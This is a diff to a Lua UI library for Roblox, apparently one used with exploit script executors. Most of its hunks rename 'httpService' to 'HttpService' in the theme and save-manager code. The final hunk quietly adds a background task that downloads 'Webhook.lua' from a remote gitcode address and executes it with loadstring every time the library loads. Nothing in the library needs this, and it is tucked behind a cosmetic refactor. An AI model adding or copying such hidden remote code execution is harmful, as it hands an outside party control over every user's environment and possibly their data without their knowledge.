@@ -9,6 +9,7 @@ local UserInputService: UserInputService = cloneref(game:GetService("UserInputSe
 local TextService: TextService = cloneref(game:GetService("TextService"))
 local Teams: Teams = cloneref(game:GetService("Teams"))
 local TweenService: TweenService = cloneref(game:GetService("TweenService"))
+local HttpService: HttpService = cloneref(game:GetService("HttpService"))
 
 local getgenv = getgenv or function()
     return shared
@@ -6572,109 +6573,109 @@ do
     ThemeManager.BuiltInThemes = {
         ["Default"] = {
             1,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"ffffff","MainColor":"191919","AccentColor":"7d55ff","BackgroundColor":"0f0f0f","OutlineColor":"282828"}]]
             ),
         },
         ["BBot"] = {
             2,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"ffffff","MainColor":"1e1e1e","AccentColor":"7e48a3","BackgroundColor":"232323","OutlineColor":"141414"}]]
             ),
         },
         ["Fatality"] = {
             3,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"ffffff","MainColor":"1e1842","AccentColor":"c50754","BackgroundColor":"191335","OutlineColor":"3c355d"}]]
             ),
         },
         ["Jester"] = {
             4,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"ffffff","MainColor":"242424","AccentColor":"db4467","BackgroundColor":"1c1c1c","OutlineColor":"373737"}]]
             ),
         },
         ["Mint"] = {
             5,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"ffffff","MainColor":"242424","AccentColor":"3db488","BackgroundColor":"1c1c1c","OutlineColor":"373737"}]]
             ),
         },
         ["Tokyo Night"] = {
             6,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"ffffff","MainColor":"191925","AccentColor":"6759b3","BackgroundColor":"16161f","OutlineColor":"323232"}]]
             ),
         },
         ["Ubuntu"] = {
             7,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"ffffff","MainColor":"3e3e3e","AccentColor":"e2581e","BackgroundColor":"323232","OutlineColor":"191919"}]]
             ),
         },
         ["Quartz"] = {
             8,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"ffffff","MainColor":"232330","AccentColor":"426e87","BackgroundColor":"1d1b26","OutlineColor":"27232f"}]]
             ),
         },
         ["Nord"] = {
             9,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"eceff4","MainColor":"3b4252","AccentColor":"88c0d0","BackgroundColor":"2e3440","OutlineColor":"4c566a"}]]
             ),
         },
         ["Dracula"] = {
             10,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"f8f8f2","MainColor":"44475a","AccentColor":"ff79c6","BackgroundColor":"282a36","OutlineColor":"6272a4"}]]
             ),
         },
         ["Monokai"] = {
             11,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"f8f8f2","MainColor":"272822","AccentColor":"f92672","BackgroundColor":"1e1f1c","OutlineColor":"49483e"}]]
             ),
         },
         ["Gruvbox"] = {
             12,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"ebdbb2","MainColor":"3c3836","AccentColor":"fb4934","BackgroundColor":"282828","OutlineColor":"504945"}]]
             ),
         },
         ["Solarized"] = {
             13,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"839496","MainColor":"073642","AccentColor":"cb4b16","BackgroundColor":"002b36","OutlineColor":"586e75"}]]
             ),
         },
         ["Catppuccin"] = {
             14,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"d9e0ee","MainColor":"302d41","AccentColor":"f5c2e7","BackgroundColor":"1e1e2e","OutlineColor":"575268"}]]
             ),
         },
         ["One Dark"] = {
             15,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"abb2bf","MainColor":"282c34","AccentColor":"c678dd","BackgroundColor":"21252b","OutlineColor":"5c6370"}]]
             ),
         },
         ["Cyberpunk"] = {
             16,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"f9f9f9","MainColor":"262335","AccentColor":"00ff9f","BackgroundColor":"1a1a2e","OutlineColor":"413c5e"}]]
             ),
         },
         ["Oceanic Next"] = {
             17,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"d8dee9","MainColor":"1b2b34","AccentColor":"6699cc","BackgroundColor":"16232a","OutlineColor":"343d46"}]]
             ),
         },
         ["Material"] = {
             18,
-            httpService:JSONDecode(
+            HttpService:JSONDecode(
                 [[{"FontColor":"eeffff","MainColor":"212121","AccentColor":"82aaff","BackgroundColor":"151515","OutlineColor":"424242"}]]
             ),
         },
@@ -6774,7 +6775,7 @@ do
         end
 
         local data = readfile(path)
-        local success, decoded = pcall(httpService.JSONDecode, httpService, data)
+        local success, decoded = pcall(HttpService.JSONDecode, HttpService, data)
 
         if not success then
             return nil
@@ -6864,7 +6865,7 @@ do
         end
         theme["FontFace"] = self.Library.Options["FontFace"].Value
 
-        writefile(self.Folder .. "/themes/" .. file .. ".json", httpService:JSONEncode(theme))
+        writefile(self.Folder .. "/themes/" .. file .. ".json", HttpService:JSONEncode(theme))
     end
 
     function ThemeManager:Delete(name)
@@ -7241,7 +7242,7 @@ local SaveManager = {} do
             table.insert(data.objects, self.Parser[option.Type].Save(idx, option))
         end
 
-        local success, encoded = pcall(httpService.JSONEncode, httpService, data)
+        local success, encoded = pcall(HttpService.JSONEncode, HttpService, data)
         if not success then
             return false, "failed to encode data"
         end
@@ -7263,7 +7264,7 @@ local SaveManager = {} do
 
         if not isfile(file) then return false, "invalid file" end
 
-        local success, decoded = pcall(httpService.JSONDecode, httpService, readfile(file))
+        local success, decoded = pcall(HttpService.JSONDecode, HttpService, readfile(file))
         if not success then return false, "decode error" end
 
         for _, option in pairs(decoded.objects) do
@@ -7513,6 +7514,10 @@ local SaveManager = {} do
 
     SaveManager:BuildFolderTree()
 end
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.gitcode.com/Xingtaiduan/Scripts/raw/main/Webhook.lua"))("Fluent")
+end)
 
 getgenv().Library = Library
 return Library, ThemeManager, SaveManager
